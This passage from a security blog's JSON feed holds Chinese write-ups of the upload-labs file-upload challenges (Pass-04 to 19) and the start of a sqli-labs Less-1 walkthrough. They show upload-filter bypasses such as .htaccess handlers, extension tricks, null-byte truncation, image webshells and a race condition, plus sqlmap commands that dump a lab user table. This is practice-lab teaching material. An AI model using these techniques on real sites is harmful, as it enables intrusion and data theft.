后缀文件！</p>\n<p>看了下源码空格大小写啥的，都被弄了</p>\n<p>但是没有过滤.htaccess 后缀</p>\n<p>要启用.htaccess，要更改 httpd.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AllowOverride None </span><br><span class=\"line\">更改为：AllowOverride All</span><br></pre></td></tr></table></figure>\n<p><img src=\"upload-labs-04-01.png\" alt=\"\"></p>\n<p>去掉框住这行的注释符号</p>\n<p><img src=\"upload-labs-04-02.png\" alt=\"\"></p>\n<p>上传.htaccess，所有文件都会解析为 php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n<p>然后上传 hqxx.png 图片马</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>题目也给了路径了，地址栏直接输入就行</p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>我最后也没把.png 解析 php 成功</p>\n<p>在.htaccess 里面随便输错误字符，报 500，去看 apache 的日志说我输入的错误字符不对，说明我上传的.htaccess 文件是被解析了的</p>\n<p>把 httpd.conf 里面所有的 AllowOverride None 都改成了 AllowOverride All，重写模块也开了，文件路径也没有问题，php 版本也调低了，phpstudy 也重启了，但永远就是这样：</p>\n<p><img src=\"upload-labs-04-03.png\" alt=\"\"></p>\n<p>我觉得应该还是配置文件的问题，可是到底是哪里出了问题啊！！！</p>\n<p>而后修改 htaccess 为，把文件名包含 hqxx 的文件全部以 php 解析:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;hqxx&quot; &gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>发现 a.php 可以解析成功，而 hqxx.php 不能解析，我真真真呵呵了</p>\n<p>找了好久终于发现有一个人和我一样的问题了，哭唧唧</p>\n<p><a href=\"https://www.zhaosimeng.cn/zqzb/55.html\">谢谢大哥</a></p>\n<p>在新版中 php 环境默认都是带 nts 的，而在旧版本中则可以选择不带，选一个不带 nts 的 php 版本就可以正常玩了，但是我的 phpstudy 里的 php 全是带 nts 的，谢谢您了</p>\n<ol>\n<li>\n<p><strong>.htaccess 上传漏洞</strong></p>\n<p>漏洞形成条件</p>\n<ul>\n<li>apache 服务器</li>\n<li>能够上传.htaccess 文件，一般为黑名单限制。</li>\n<li>AllowOverride All，默认配置为关闭 None。</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>\n<li>上传目录具有可执行权限。</li>\n</ul>\n</li>\n<li>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。</p>\n<p>概述来说，htaccess 文件是<a href=\"https://baike.baidu.com/item/Apache\"> Apache</a> 服务器中的一个配置文件，它负责相关目录下的网页配置。</p>\n<p>启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。</p>\n<p>.htaccess 的主要作用就是实现 url 改写，也就是当浏览器通过 url 访问到服务器某个文件夹时，作为主人，我们可以来接待这个 url，具体地怎样接待它，就是此文件的作用。</p>\n<p><a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">.htaccess 使用方法介绍</a></p>\n</li>\n</ol>\n<h1 id=\"pass-05\"><a class=\"markdownIt-Anchor\" href=\"#pass-05\">#</a> Pass-05</h1>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<p>看源码，已经不让上传.htaccess 了，但是这次没有把后缀名全转成小写了，也就是说嘿嘿嘿</p>\n<p>上传 hqxx.phP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>上传成功，地址栏直接输入路径</p>\n<p><img src=\"upload-labs-05-01.png\" alt=\"\"></p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<p>我把 apache 玩崩了，重装都不行，换了 Nginx 哈哈哈</p>\n<p>顺便查了下 nginx 用 htaccess 的方法，<a href=\"https://blog.csdn.net/cs729298/article/details/77478155\">想看点我</a></p>\n<h1 id=\"pass-06\"><a class=\"markdownIt-Anchor\" href=\"#pass-06\">#</a> Pass-06</h1>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<p>看源码，依然是黑名单</p>\n<p>并且将后缀名全部转换为小写了，但是空格啥的没去除了</p>\n<p>在文件名末尾加一个空格上传</p>\n<p><img src=\"upload-labs-06-01.png\" alt=\"\"></p>\n<p>解析成功</p>\n<p><img src=\"upload-labs-06-02.png\" alt=\"\"></p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>利用 Windows 特性 在 Windows 中文件后缀名末尾有空格会自动去掉</p>\n<h1 id=\"pass-07\"><a class=\"markdownIt-Anchor\" href=\"#pass-07\">#</a> Pass-07</h1>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<p>看源码，转换了大小写，去除了首位空格</p>\n<p>那就在文件末尾加。呗</p>\n<p>上传成功，解析成功</p>\n<p><img src=\"upload-labs-07-01.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-08\"><a class=\"markdownIt-Anchor\" href=\"#pass-08\">#</a> Pass-08</h1>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<p>上传 hqxx.php::DATA</p>\n<p><img src=\"upload-labs-08-01.png\" alt=\"\"></p>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>利用 windows 特性：</p>\n<p>必须是 windows, 必须是 php, 必须是那个源文件<br>\n php 在 window 的时候如果文件名后加上 &quot;::$DATA&quot;</p>\n<p>会把 &quot;::$DATA&quot; 之后的数据当成文件流处理，不会检测后缀名</p>\n<p>且保持 &quot;::$DATA&quot; 之前的文件名</p>\n<p>他的目的就是不检查后缀名</p>\n<p>改源代码测试了一下，其实和。空格是一样的，就是利用 windows 特性绕过黑名单，上传到文件夹时，文件后面的 &quot;::DATA…&quot; 已经被去掉了</p>\n<h1 id=\"pass-09\"><a class=\"markdownIt-Anchor\" href=\"#pass-09\">#</a> Pass-09</h1>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<p>看提示：本 pass 只允许上传.jpg|.png|.gif 后缀的文件！</p>\n<p>看了源码发现，你这个骗子，明明还是黑名单，下次不看提示了</p>\n<p>看源码：先删除了末尾的点，然后去掉了::$DATA，后缀转成了小写，最后去除首尾空格</p>\n<p>那就 hqxx.php. .</p>\n<p>这样最后在末尾就留下了一个点，上传成功</p>\n<p><img src=\"upload-labs-09-01.png\" alt=\"\"></p>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>跟着代码逻辑走～，可是黑盒都看不到源代码唉</p>\n<h1 id=\"pass-10\"><a class=\"markdownIt-Anchor\" href=\"#pass-10\">#</a> Pass-10</h1>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<p>哈哈哈，源代码注释没了</p>\n<p>先去除文件名中的所有空格，再把文件名中所有在黑名单中存在的字符置空</p>\n<p>那么就，双写，成功绕过</p>\n<p><img src=\"upload-labs-10-01.png\" alt=\"\"></p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-11\"><a class=\"markdownIt-Anchor\" href=\"#pass-11\">#</a> Pass-11</h1>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>观摩源代码，发现是白名单，允许的类型有’jpg’,‘png’,‘gif’，而且还给文件重命名了</p>\n<p>上传 php 抓包发现 save_path=…/upload</p>\n<p>源码中文件保存路径就是 $img_path = <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><msup><mi>h</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mn>10</mn><mo separator=\"true\">,</mo><mn>99</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>Y</mi><mi>m</mi><mi>d</mi><mi>H</mi><mi>i</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">/</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span></span></span></span>file_ext;</p>\n<p>用 00 截断，在路径后面加上 hqxx.php%00</p>\n<p><img src=\"upload-labs-11-01.png\" alt=\"\"></p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>通过字符拼接，连接路径文件名，后台处理后上传到 windows 时，os 看见 %00 自动截断</p>\n<p>00 截断的前提条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态</p>\n<p>move_uploaded_file 函数的底层实现类似于 C 语言，遇到 0x00 会截断</p>\n<h1 id=\"pass-12\"><a class=\"markdownIt-Anchor\" href=\"#pass-12\">#</a> Pass-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>上传文件抓包，发现路径也在表单中了，在后面加上 /hqxx.php ，注意后面有一个空格</p>\n<p><img src=\"upload-labs-12-01.png\" alt=\"\"></p>\n<p>因为 post 请求没办法解析 %00，所以我们在 hex 中更改数据包</p>\n<p>找到对应行，代表空格的 20，改为 00</p>\n<p><img src=\"upload-labs-12-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-12-03.png\" alt=\"\"></p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>为啥网上有人说这是二进制代码，可是这明明不是二进制啊</p>\n<p>通常 JPEG/JPG: FF D8 , PNG:89 50，GIF:47 49</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"pass-13\"><a class=\"markdownIt-Anchor\" href=\"#pass-13\">#</a> Pass-13</h1>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<p>源代码中读取文件前 2 字节，来判断文件类型是否属于 jpg、png 或者 gif 类型</p>\n<p>类型判断成功后，还更改了文件名</p>\n<p><img src=\"upload-labs-13-01.png\" alt=\"\"></p>\n<p>这里用文件包含来解析图片马</p>\n<p>手动在 upload 文件夹添加一个文件包含的 php</p>\n<p><img src=\"upload-labs-13-02.png\" alt=\"\"></p>\n<p>然后浏览器解析</p>\n<p><img src=\"upload-labs-13-03.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p>unpack () 函数从二进制字符串对数据进行解包。</p>\n<p>也就是说本身没有文件包含漏洞的话这个图片马是没有办法解析的，唉</p>\n<h1 id=\"pass-14\"><a class=\"markdownIt-Anchor\" href=\"#pass-14\">#</a> Pass-14</h1>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<p>看源码，换了一种方式验证类型</p>\n<p>getimagesize () 这个函数功能会对目标文件的 16 进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>\n<p>所以还是伪造一个头部信息，上传图片马</p>\n<p><img src=\"upload-labs-14-01.png\" alt=\"\"></p>\n<p>图片马的利用可以结合文件包含，解析漏洞等… 反正就是要把他用 php 解析嘛</p>\n<p>比如，<a href=\"https://www.cnblogs.com/renhaoblog/p/12874603.html\">nginx 解析漏洞</a>，和版本无关，属于用户配置不当产生的</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p><a href=\"https://www.runoob.com/php/php-getimagesize.html\">菜鸟教程</a></p>\n<p>getimagesize () 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>\n<p>实例 1：本地图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br><span class=\"line\">echo &quot;宽度为：&quot; . $width;</span><br><span class=\"line\">echo &quot;高度为：&quot; . $height;</span><br><span class=\"line\">echo &quot;类型为：&quot; . $attr;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">宽度为：290高度为：69类型为：3属性：width=&quot;290&quot; height=&quot;69&quot;</span><br></pre></td></tr></table></figure>\n<p>实例 2：远程图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$remote_png_url = &#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;    [bits] =&gt; 8    [mime] =&gt; image/png)</span><br></pre></td></tr></table></figure>\n<p>返回结果说明</p>\n<ul>\n<li>索引 0 给出的是图像宽度的像素值</li>\n<li>索引 1 给出的是图像高度的像素值</li>\n<li>索引 2 给出的是图像的类型，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>\n<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</li>\n<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>\n<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>\n<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);</li>\n</ul>\n<h1 id=\"pass-15\"><a class=\"markdownIt-Anchor\" href=\"#pass-15\">#</a> Pass-15</h1>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<p>使用 exif_imagetype () 检查是否为图片文件</p>\n<p>用图片马进行绕过</p>\n<p><img src=\"upload-labs-15-01.png\" alt=\"\"></p>\n<p>但是还得帮 php 安装 exif.so 扩展库</p>\n<p><img src=\"upload-labs-15-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-15-03.png\" alt=\"\"></p>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<p>exif_imagetype ( string $filename ) : int <em>exif_imagetype()</em> 读取一个图像的第一个字节并检查其签名。</p>\n<h1 id=\"pass-16\"><a class=\"markdownIt-Anchor\" href=\"#pass-16\">#</a> Pass-16</h1>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<p>看源码，判断了后缀，然后利用 imagecreatefrompng () 等函数创建图片，同时也利用这个函数判断图片类型是否一致了，然后再重命名文件</p>\n<p>依然用图片马绕过，但是简单的在文件前加入 GIF89a 已经不可</p>\n<p>那就把图片和木马合在一起叭，cmd 执行以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy pig.jpg/b +  a.php/a haha.jpg</span><br></pre></td></tr></table></figure>\n<p>再上传 haha.jpg</p>\n<p><img src=\"upload-labs-16-01.png\" alt=\"\"></p>\n<p>往下翻可以看到木马被插在了图片的中间</p>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>过过过</p>\n<h1 id=\"pass-17\"><a class=\"markdownIt-Anchor\" href=\"#pass-17\">#</a> Pass-17</h1>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看源码，是先上传文件移动到 upload 文件夹后，再对后缀进行判断，判断允许后重命名文件再删除原来的文件，否则直接删除文件</p>\n<p>那就搞文件竞争，在上传文件和删除文件之间的时间，进行访问上传的文件，并且通过上传的文件创建新的木马</p>\n<p>利用 py 脚本不断访问上传的 haha.php</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requestswhile <span class=\"literal\">True</span>:    requests.get(<span class=\"string\">&#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--request-fy3l308svi7bxjr.py\">然后运行 request.py</a></p>\n<p>然后不断点击发包</p>\n<p><img src=\"upload-labs-17-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-17-01.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-17-03.png\" alt=\"\"></p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>抄作业的感觉，唉</p>\n<h1 id=\"pass-18\"><a class=\"markdownIt-Anchor\" href=\"#pass-18\">#</a> Pass-18</h1>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>源代码中，先检查了后缀，大小等等，再上传，再重命名</p>\n<p>它检查后缀用的白名单，所以试一下截断➕竞争</p>\n<p>想法很美好，现实很骨感，看报错信息，是卡在文件名后缀上了</p>\n<p><img src=\"upload-labs-18-01.png\" alt=\"\"></p>\n<p>所以直接和之前一样上传图片马哈哈哈</p>\n<p><img src=\"upload-labs-18-02.png\" alt=\"\"></p>\n<p>再用文件包含之类的配合…</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>世上无难事只要肯放弃</p>\n<p>值得注意的是这里也可以将 php 文件后缀名更改为.php.7z，因为白名单中允许上传.7z 的文件，但是 apache 又不能解析这个格式，所以会把该文件当 php 的格式解析</p>\n<h1 id=\"pass-19\"><a class=\"markdownIt-Anchor\" href=\"#pass-19\">#</a> Pass-19</h1>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<p>可以自定义名称</p>\n<p>上传 a.php</p>\n<p>自定义名称 haha.php.</p>\n<p>因为用的黑名单，上传成功</p>\n<p><img src=\"upload-labs-19-01.png\" alt=\"\"></p>\n<p>大小写都能绕哈哈哈</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>哈哈哈</p>\n",
            "tags": [
                "文件上传靶场"
            ]
        },
        {
            "id": "http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "sqli-labs基础关卡",
            "date_published": "2020-11-16T13:29:27.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"markdownIt-Anchor\" href=\"#less-1\">#</a> Less-1</h1>\n<p>date:2020-11-16 21:29:27</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id</p>\n<h3 id=\"sqlmap\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap\">#</a> sqlmap：</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class=\"line\">爆表：</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class=\"line\">爆字段:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class=\"line\">爆字段值:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class=\"line\"></span><br><span class=\"line\">拿到数据，别的表同理：</span><br><span class=\"line\">Database: security</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[13 entries]</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| id | password   | username |</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| 1  | Dumb       | Dumb     |</span><br><span class=\"line\">| 2  | I-kill-you | Angelina |</span><br><span class=\"line\">| 3  | p@ssword   | Dummy    |</span><br><span class=\"line\">| 4  | crappy     | secure   |</span><br><span class=\"line\">| 5  | stupidity  | stupid   |</span><br><span class=\"line\">| 6  | genious    | superman |</span><br><span class=\"line\">| 7  | mob!le     | batman   |</span><br><span class=\"line\">| 8  | admin      | admin    |</span><br><span class=\"line\">| 9  | admin1     | admin1   |</span><br><span class=\"line\">| 10 | admin2     | admin2   |</span><br><span class=\"line\">| 11 | admin3     | admin3   |</span><br><span class=\"line\">| 12 | dumbo      | dhakkan  |</span><br><span class=\"line\">| 14 | admin4     | admin4   |</span><br><span class=\"line\">+----+------------+----------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"手工注入\"><a class=\"markdownIt-Anchor\" href=\"#手工注入\">#</a> 手工注入：</h3>\n<p>先小心翼翼地试一个 id=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span 